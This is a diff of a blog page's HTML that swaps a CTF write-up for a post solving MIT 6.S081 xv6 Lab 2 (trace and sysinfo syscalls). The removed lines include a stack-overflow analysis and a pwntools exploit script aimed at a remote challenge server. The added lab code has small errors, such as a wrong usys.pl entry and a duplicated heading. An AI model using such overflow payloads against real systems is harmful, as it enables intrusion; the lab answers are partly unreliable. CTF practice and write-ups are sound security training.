@@ -139,10 +139,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="http://l0tus.vip/cn/XCTF-forgot-WP/">
+  <link rel="canonical" href="http://l0tus.vip/cn/xv6_2/">
   <title>
     
-      XCTF-forgot-WP - l0tus&#39; blog
+      MIT 6.S081：Operating System Engineering 2021 FALL - l0tus&#39; blog
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -301,6 +301,30 @@
           
           
           
+          <!-- LangSelect start -->
+          <!-- LangSelect -->
+<li>
+  <a id="lang-select-label"><i class="fa fa-globe"></i>
+    <span>
+      简体中文
+    </span>
+    <select id="lang-select" data-canonical="cn/xv6_2/">
+      
+      
+      <option value="en" >
+        English
+      </option>
+      
+      <option value="cn"  selected >
+        简体中文
+      </option>
+      
+    </select>
+  </a>
+</li>
+
+          <!-- LangSelect end -->
+          
           
           
         </ul>
@@ -352,19 +376,19 @@
     .body--light {
       /* intro-header */
       --intro-header-background-image-url-home: url('/img/header_img/cat.png');
-      --intro-header-background-image-url-post: url('/img/header_img/forgot_header.png');
-      --intro-header-background-image-url-page: url('//img/header_img/forgot_header.png');
+      --intro-header-background-image-url-post: url('/img/header_img/universe.jpg');
+      --intro-header-background-image-url-page: url('//img/header_img/universe.jpg');
     }
     .body--dark {
       --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/cat.png');
-      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/forgot_header.png');
-      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//img/header_img/forgot_header.png');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/universe.jpg');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//img/header_img/universe.jpg');
     }
 
     header.intro-header {
        /*post*/
         background-image: var(--intro-header-background-image-url-post);
-        /* background-image: url('/img/header_img/forgot_header.png'); */
+        /* background-image: url('/img/header_img/universe.jpg'); */
       
     }
 
@@ -389,16 +413,18 @@
           <div class="post-heading">
             <div class="tags">
               
-              <a class="tag" href="/tags/#pwn笔记" title="pwn笔记">pwn笔记</a>
+              <a class="tag" href="/tags/#OS" title="OS">OS</a>
               
-              <a class="tag" href="/tags/#write up" title="write up">write up</a>
+              <a class="tag" href="/tags/#labs" title="labs">labs</a>
+              
+              <a class="tag" href="/tags/#xv6" title="xv6">xv6</a>
               
             </div>
-            <h1>XCTF-forgot-WP</h1>
-            <h2 class="subheading"></h2>
+            <h1>MIT 6.S081：Operating System Engineering 2021 FALL</h1>
+            <h2 class="subheading">Lab2：system calls</h2>
             <span class="meta">
               Posted by l0tus on
-              2023-03-08
+              2023-07-23
             </span>
 
 
@@ -406,11 +432,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">1</span> Minutes
+              Estimated Reading Time <span class="post-count">6</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">343</span> In Total
+              Words <span class="post-count">1.1k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -472,37 +498,51 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h2 id="checksec">checksec</h2>
-<p><img src="forgot_2.png" alt=""><br>
-一道正常的栈题，只开了NX</p>
-<h2 id="反编译">反编译</h2>
-<p><img src="forgot_3.png" alt=""><br>
-第一次fgets输入长度为32，后面有一次scanf输入v2，结合栈的排布可以发现输入v2的时候可以溢出覆盖s，那么我们只需要控制好第二次输入就可以了<br>
-shift+f12看到有cat flag的字符串，找到对应函数:<br>
-<img src="forgot_5.png" alt=""><br>
-<img src="forgot_4.png" alt=""><br>
-程序最后对&quot;v3[–v5]&quot;的地址会直接调用，而前面的程序就是通过判断v2[i]的值是否在小写字母范围内对v5进行累加（在v5&gt;=5的情况下），最大到10.<br>
-那么我们需要做的就是通过覆盖v3[9]的地址为后门函数<br>
-然后需要做的是覆盖v5的初值为5及以上，然后让程序自带的循环将其加至10<br>
-需要注意的是不能一开始直接覆盖成0x9或者0xA，因为scanf读入%s的时候输入16进制数会解析成对应的ascii值<br>
-<img src="forgot_6.png" alt=""><br>
-而scanf读到0x9和0xA对应的ascii码值就停了，前面的不会，所以不能是直接覆盖成0x9或0xA<br>
-小细节，也算是学到东西</p>
-<h2 id="exp">exp</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./for_got&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="string">&quot;50072&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;l0tus&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x44</span>+p32(<span class="number">0x80486CC</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <h2 id="Lab2-system-calls">Lab2: system calls</h2>
+<h3 id="System-call-tracing（moderate）">System call tracing（moderate）</h3>
+<p>First we look up the hints</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. Add $U/_trace <span class="keyword">to</span> UPROGS in Makefile</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. <span class="keyword">Run</span> make qemu <span class="keyword">and</span> you will see that the compiler cannot compile user/trace.c, because the user-space stubs <span class="keyword">for</span> the <span class="keyword">system</span> <span class="keyword">call</span> don<span class="comment">&#x27;t exist yet: add a prototype for the system call to user/user.h, a stub to user/usys.pl, and a syscall number to kernel/syscall.h. The Makefile invokes the perl script user/usys.pl, which produces user/usys.S, the actual system call stubs, which use the RISC-V ecall instruction to transition to the kernel. Once you fix the compilation issues, run trace 32 grep hello README; it will fail because you haven&#x27;t implemented the system call in the kernel yet.</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. Add a sys_trace() function in kernel/sysproc.c that implements the <span class="keyword">new</span> <span class="keyword">system</span> <span class="keyword">call</span> by <span class="comment">remembering its argument in a new variable in the proc structure (see kernel/proc.h). The functions to retrieve system call arguments from user space are in kernel/syscall.c, and you can see examples of their use in kernel/sysproc.c.</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>. Modify fork() (see kernel/proc.c) <span class="keyword">to</span> copy the trace mask from the parent <span class="keyword">to</span> the child process.</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>. Modify the syscall() function in kernel/syscall.c <span class="keyword">to</span> <span class="keyword">print</span> the trace output. You will need <span class="keyword">to</span> add an array of syscall names <span class="keyword">to</span> index into.</span><br></pre></td></tr></table></figure>
+<p>First we need to add a new syscall number in kernel/syscall.h</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_trace 22</span></span><br></pre></td></tr></table></figure>
+<p>Then we need to add a prototype for the system call to user/user.h</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">trace</span><span class="params">(<span class="keyword">int</span> mask)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>Then we need to add a entry in user/usys.pl</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry(<span class="string">&quot;sysinfo&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>Then in the sysproc.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> mask;</span><br><span class="line">  <span class="keyword">if</span> (argint(<span class="number">0</span>, &amp;mask) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  myproc()-&gt;mask = mask; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Then in the fork() function in proc.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">safestrcpy(np-&gt;name, p-&gt;name, <span class="keyword">sizeof</span>(p-&gt;name));</span><br><span class="line"></span><br><span class="line">np-&gt;mask = p-&gt;mask;<span class="comment">//add this line</span></span><br><span class="line">pid = np-&gt;pid;</span><br><span class="line"></span><br><span class="line">release(&amp;np-&gt;lock);</span><br></pre></td></tr></table></figure>
+<p>Then in the syscall() function in syscall.c<br>
+first we need to add a array of syscall names to index into</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *syscalls_name[] = &#123;</span><br><span class="line">[SYS_fork]    <span class="string">&quot;fork&quot;</span>,</span><br><span class="line">[SYS_exit]    <span class="string">&quot;exit&quot;</span>,</span><br><span class="line">[SYS_wait]    <span class="string">&quot;wait&quot;</span>,</span><br><span class="line">[SYS_pipe]    <span class="string">&quot;pipe&quot;</span>,</span><br><span class="line">[SYS_read]    <span class="string">&quot;read&quot;</span>,</span><br><span class="line">[SYS_kill]    <span class="string">&quot;kill&quot;</span>,</span><br><span class="line">[SYS_exec]    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">[SYS_fstat]   <span class="string">&quot;fstat&quot;</span>,</span><br><span class="line">[SYS_chdir]   <span class="string">&quot;chdir&quot;</span>,</span><br><span class="line">[SYS_dup]     <span class="string">&quot;dup&quot;</span>,</span><br><span class="line">[SYS_getpid]  <span class="string">&quot;getpid&quot;</span>,</span><br><span class="line">[SYS_sbrk]    <span class="string">&quot;sbrk&quot;</span>,</span><br><span class="line">[SYS_sleep]   <span class="string">&quot;sleep&quot;</span>,</span><br><span class="line">[SYS_uptime]  <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">[SYS_open]    <span class="string">&quot;open&quot;</span>,</span><br><span class="line">[SYS_write]   <span class="string">&quot;write&quot;</span>,</span><br><span class="line">[SYS_mknod]   <span class="string">&quot;mknod&quot;</span>,</span><br><span class="line">[SYS_unlink]  <span class="string">&quot;unlink&quot;</span>,</span><br><span class="line">[SYS_link]    <span class="string">&quot;link&quot;</span>,</span><br><span class="line">[SYS_mkdir]   <span class="string">&quot;mkdir&quot;</span>,</span><br><span class="line">[SYS_close]   <span class="string">&quot;close&quot;</span>,</span><br><span class="line">[SYS_trace]   <span class="string">&quot;trace&quot;</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>and then add “sys_trace” into the&quot;static uint64 (*syscalls[])(void) = {&quot;and “extern uint64 sys_sysinfo(void);”</p>
+<p>finally we need to add the print function in the syscall() function</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">syscall(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">    <span class="keyword">if</span>((<span class="number">1</span>&lt;&lt;num) &amp; p-&gt;mask)<span class="comment">//add this</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, syscalls_name[num], p-&gt;trapframe-&gt;a0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>now the trace.c can run successfully</p>
+<h3 id="System-call-tracing（moderate）-2">System call tracing（moderate）</h3>
+<p>First we look up the hints</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. Add $U/_sysinfotest <span class="keyword">to</span> UPROGS in Makefile</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. Run make qemu<span class="comment">; user/sysinfotest.c will fail to compile. Add the system call sysinfo, following the same steps as in the previous assignment. To declare the prototype for sysinfo() in user/user.h you need predeclare the existence of struct sysinfo:</span></span><br><span class="line"></span><br><span class="line">    struct sysinfo<span class="comment">;</span></span><br><span class="line">    int sysinfo(struct sysinfo *)<span class="comment">;</span></span><br><span class="line">  </span><br><span class="line"><span class="number">3</span>. Once you fix the compilation issues<span class="punctuation">,</span> run sysinfotest<span class="comment">; it will fail because you haven&#x27;t implemented the system call in the kernel yet.</span></span><br><span class="line">sysinfo needs <span class="keyword">to</span> copy a struct sysinfo back <span class="keyword">to</span> user space<span class="comment">; see sys_fstat() (kernel/sysfile.c) and filestat() (kernel/file.c) for examples of how to do that using copyout().</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>. To collect the amount of <span class="keyword">free</span> memory<span class="punctuation">,</span> <span class="keyword">add</span> a function <span class="keyword">to</span> kernel/kalloc.<span class="keyword">c</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>. To collect the number of processes<span class="punctuation">,</span> <span class="keyword">add</span> a function <span class="keyword">to</span> kernel/proc.<span class="keyword">c</span></span><br></pre></td></tr></table></figure>
+<p>the former steps are similar to the previous one, so I will not repeat them here</p>
+<p>the very steps we need to do are as follows<br>
+we need to add a function to kernel/kalloc.c to calculate the amount of free memory</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getfreemem</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 num=<span class="number">0</span>;</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">p</span>=</span>kmem.freelist;</span><br><span class="line">  <span class="keyword">while</span>(p!=<span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    num++;</span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">return</span> num*PGSIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>and then we need to add a function to kernel/proc.c to calculate the number of processes</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getprocnum</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  uint64 num = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++)&#123;</span><br><span class="line">    acquire(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state != UNUSED)&#123;</span><br><span class="line">      num++;</span><br><span class="line">    &#125;</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>then we need to add a function to kernel/sysproc.c to implement the system call</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_sysinfo</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> * <span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  info.freemem=getfreemem();</span><br><span class="line">  info.nproc=getprocnum();</span><br><span class="line"></span><br><span class="line">  uint64 addr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argaddr(<span class="number">0</span>, &amp;addr) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copyout(p-&gt;pagetable, addr, (<span class="keyword">char</span> *)&amp;info, <span class="keyword">sizeof</span>(info)) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>and don’t forget to declare the functions in kernel/defs.h</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kalloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>*           <span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">kinit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>             <span class="title">getfreemem</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">//add this</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// proc.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>             <span class="title">cpuid</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">exit</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>             <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>             <span class="title">growproc</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">proc_mapstacks</span><span class="params">(<span class="keyword">pagetable_t</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">pagetable_t</span>     <span class="title">proc_pagetable</span><span class="params">(struct proc *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">proc_freepagetable</span><span class="params">(<span class="keyword">pagetable_t</span>, uint64)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>             <span class="title">kill</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function">struct cpu*     <span class="title">mycpu</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function">struct cpu*     <span class="title">getmycpu</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function">struct proc*    <span class="title">myproc</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">procinit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">scheduler</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((noreturn))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">sched</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">sleep</span><span class="params">(<span class="keyword">void</span>*, struct spinlock*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">userinit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>             <span class="title">wait</span><span class="params">(uint64)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">wakeup</span><span class="params">(<span class="keyword">void</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">yield</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>             <span class="title">either_copyout</span><span class="params">(<span class="keyword">int</span> user_dst, uint64 dst, <span class="keyword">void</span> *src, uint64 len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>             <span class="title">either_copyin</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">int</span> user_src, uint64 src, uint64 len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>            <span class="title">procdump</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>             <span class="title">getprocnum</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">//add this</span></span><br></pre></td></tr></table></figure>
+<p>Thus we finished the lab2.</p>
 
 
         <hr>
         <!-- Pager -->
         <ul class="pager">
           
-          <li class="previous">
-            <a href="/cn/totolink/" data-toggle="tooltip" data-placement="top" title="TOTOLINK路由器漏洞复现笔记">&larr; Previous Post</a>
-          </li>
-          
           
           <li class="next">
-            <a href="/cn/XCTF-greeting-150-WP/" data-toggle="tooltip" data-placement="top" title="XCTF-greeting-150-WP">Next Post &rarr;</a>
+            <a href="/cn/pwn_vpn/" data-toggle="tooltip" data-placement="top" title="论文阅读："Oh-Pwn-VPN! Security Analysis of OpenVPN-based Android Apps"">Next Post &rarr;</a>
           </li>
           
         </ul>
@@ -551,7 +591,7 @@ shift+f12看到有cat flag的字符串，找到对应函数:<br>
       </a>
     </li>
     <li class="social-share-li">
-      <a target="_blank" class="social-share-icon" href="mailto:?subject=XCTF-forgot-WP&body=Hi,I found this website and thought you might like it http://l0tus.vip/cn/XCTF-forgot-WP/">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=MIT 6.S081：Operating System Engineering 2021 FALL&body=Hi,I found this website and thought you might like it http://l0tus.vip/cn/xv6_2/">
         <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
       </a>
     </li>
@@ -586,7 +626,7 @@ shift+f12看到有cat flag的字符串，找到对应函数:<br>
       repo: '',
       owner: '',
       admin: '',
-      id: 'Wed Mar 08 2023 00:00:00 GMT+0800', // Ensure uniqueness and length less than 50
+      id: 'Sun Jul 23 2023 00:00:00 GMT+0800', // Ensure uniqueness and length less than 50
       distractionFreeMode: false, // Facebook-like distraction free mode
       perPage: 10,
       pagerDirection: 'last',
@@ -639,7 +679,7 @@ shift+f12看到有cat flag的字符串，找到对应函数:<br>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#checksec"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">checksec</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">反编译</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#exp"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">exp</span></a></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Lab2-system-calls"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Lab2: system calls</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#System-call-tracing%EF%BC%88moderate%EF%BC%89"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">System call tracing（moderate）</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#System-call-tracing%EF%BC%88moderate%EF%BC%89-2"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">System call tracing（moderate）</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -662,9 +702,11 @@ shift+f12看到有cat flag的字符串，找到对应函数:<br>
           </h5>
           <div class="tags">
             
-            <a class="tag" href="/tags/#pwn笔记" title="pwn笔记">pwn笔记</a>
+            <a class="tag" href="/tags/#OS" title="OS">OS</a>
             
-            <a class="tag" href="/tags/#write up" title="write up">write up</a>
+            <a class="tag" href="/tags/#labs" title="labs">labs</a>
+            
+            <a class="tag" href="/tags/#xv6" title="xv6">xv6</a>
             
           </div>
         </section>
